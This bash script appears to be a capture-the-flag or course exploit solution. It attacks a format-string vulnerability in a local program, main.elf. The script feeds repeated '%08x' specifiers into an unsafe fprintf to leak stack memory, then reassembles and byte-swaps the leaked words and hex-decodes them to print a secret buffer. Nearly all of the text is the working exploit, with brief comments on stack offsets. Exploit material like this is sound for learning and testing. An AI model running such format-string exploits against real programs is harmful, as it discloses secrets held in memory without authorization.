#!/bin/bash

#25 is the number of words between the location argv[1] is put on the stack for unsecure fprintf and the beginning of secret[]
#32 is the number of words in secret
receivedStr=$(./main.elf "`python -c "print '%08x'*25 + '%08x'*32"`"  | head -2 | tail -1 | awk '{printf "%s\n", $2}')

#i am removing the first and last row, then taking the second column, since the first has the unnecessary num in []

#echo ${receivedStr}


copy=${receivedStr}

len=${#copy}
echo ${len}

#for((i=0;i<$len-1;i=i+8)); do 

for((i=0;i<$len-1;i=i+8)); do 
	rev="${copy:$i:8}"; for((j=8;j>=0;j=j-2)); do rev2="$rev2${rev:$j:2}";  done 
big="$big$rev2";  rev2=""; done

#i go 4 bytes by 4 bytes (8 chars in a string, since the returned is in hex), reversing the bytes inside the string, and concatenating them reversed


echo $big | xxd -r -p 


